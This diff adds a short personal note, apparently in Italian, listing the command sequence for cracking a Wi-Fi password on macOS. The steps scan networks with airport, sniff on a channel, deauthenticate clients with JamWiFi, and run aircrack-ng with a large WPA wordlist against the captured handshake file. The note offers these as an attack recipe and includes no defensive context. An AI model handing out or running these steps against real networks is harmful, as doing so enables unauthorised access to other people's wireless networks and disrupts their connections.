@@ -1,0 +1,6 @@
+Sudo airport -s
+Airport -z
+<disattivare wifi>
+Airport en0 sniff <channel>
+<jamwifi scan e death>
+aircrack-ng -1 -a 1 -b <BSSID>  /tmp/airportSniff*.cap  -w "/Users/michelemessina/Desktop/Test\ hacking/Metodo_Per_Hackerare_Password_Wi-Fi/BIG-WPA-LIST-1.txt" 
